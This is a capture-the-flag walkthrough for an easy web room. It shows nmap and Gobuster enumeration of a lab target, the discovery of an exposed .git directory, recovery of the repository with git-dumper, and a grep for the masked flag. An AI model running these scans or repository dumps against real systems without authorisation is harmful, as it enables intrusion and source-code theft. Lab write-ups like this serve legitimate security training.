# TryHackMe Hacker Holidays 2026 - Room 404: Byte Lotus Walkthrough

## Room information

**Type:** Walkthrough
**Category:** Web / Directory Enumeration
**Difficulty:** Easy

---

# Solution

## Task 1: Enumeration

The first step was to identify the services running on the target machine.

```bash
nmap -sV -sC <TARGET_IP>
```

The scan revealed the following open ports:

```text
22/tcp   SSH
8080/tcp HTTP
```

The web application was running on port 8080, so the next step was to enumerate the web service.

---

## Task 2: Web Enumeration

The website was accessible at:

```text
http://<TARGET_IP>:8080
```

The page source did not reveal any useful information.

Since the room focuses on directory enumeration, hidden files and directories were searched using Gobuster.

```bash
gobuster dir -u http://<TARGET_IP>:8080 \
-w /usr/share/wordlists/dirb/common.txt
```

The scan returned:

```text
.git/HEAD (Status: 200)
```

The exposed `.git` directory indicated that the application's Git repository was publicly accessible.

---

## Task 3: Dumping the Git Repository

To recover the exposed source code, `git-dumper` was used.

Kali Linux prevents global Python package installation by default, so a virtual environment was created first.

```bash
python3 -m venv venv
source venv/bin/activate
pip install git-dumper
```

The repository was then downloaded:

```bash
git-dumper http://<TARGET_IP>:8080/.git dump
```

After the process completed, the extracted files were:

```bash
cd dump
ls
```

Output:

```text
app.js
index.html
README.md
```

---

## Task 4: Finding the Flag

The available source files were checked for useful information.

First, `app.js` was reviewed:

```bash
cat app.js
```

The file only contained frontend code and an API reference:

```javascript
const API = "/api/guest";
```

No flag was present in this file.

A search was performed across the repository:

```bash
grep -Ri "flag" .
```

The flag was found inside `README.md`:

```text
Staging flag (remove before launch): THM{********_*****_********}
```

---

## Flag

```text
THM{********_*****_********}
```
